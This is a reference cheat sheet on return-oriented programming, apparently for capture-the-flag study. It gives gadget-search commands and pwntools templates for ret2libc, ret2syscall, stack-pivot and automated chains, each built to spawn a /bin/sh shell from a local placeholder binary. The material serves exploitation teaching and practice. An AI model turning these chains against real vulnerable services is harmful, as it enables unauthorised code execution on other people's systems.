# ROP Chains - Return-Oriented Programming

## When to Use ROP
```
NX/DEP enabled → can't execute shellcode directly on stack
Need to chain existing code (gadgets) to achieve execution
```

## Finding Gadgets
```bash
ROPgadget --binary ./binary
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --string "/bin/sh"

ropper --file ./binary
ropper --file ./binary --search "pop rdi"
```

## Basic ret2libc Chain (x86_64)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

# Find pop rdi; ret gadget
pop_rdi = 0x0000000000401234  # from ROPgadget output

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])   # or any GOT entry to leak
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # return to main to continue exploitation

p.sendline(payload)
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']

# Second stage: call system('/bin/sh')
payload2 = b'A' * offset
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh\x00')))
payload2 += p64(libc.symbols['system'])
p.sendline(payload2)
p.interactive()
```

## x86 (32-bit) ROP Chain
```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')

# x86 calling convention uses stack, not registers
payload = b'A' * offset
payload += p32(elf.plt['system'])
payload += p32(0xdeadbeef)          # fake return address (doesn't matter if ending exploit)
payload += p32(next(elf.search(b'/bin/sh\x00')))
p.sendline(payload)
```

## ret2syscall (execve via syscall gadget, no libc needed)
```python
from pwn import *

# Find: pop rax; ret / pop rdi; ret / pop rsi; ret / pop rdx; ret / syscall
# Build execve("/bin/sh", NULL, NULL)

payload = b'A' * offset
payload += p64(pop_rax) + p64(59)          # sys_execve number
payload += p64(pop_rdi) + p64(binsh_addr)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall_gadget)
```

## Stack Pivot (when limited stack space for full chain)
```python
# pop rsp; ret  gadget, or leave; ret
# Redirect stack pointer to attacker-controlled buffer (heap/bss/data) with more room
payload = b'A' * offset
payload += p64(pop_rsp_gadget)
payload += p64(new_stack_location)
```

## Using pwntools ROP Class (Automated)
```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh\x00'))])
print(rop.dump())

payload = b'A' * offset + rop.chain()
```

## Gadget Reference (Common x86_64)
```
pop rdi; ret            # Set first argument
pop rsi; ret             # Set second argument
pop rdx; ret             # Set third argument
pop rax; ret             # Set syscall number
syscall                  # Trigger syscall
leave; ret               # Stack pivot alternative
```
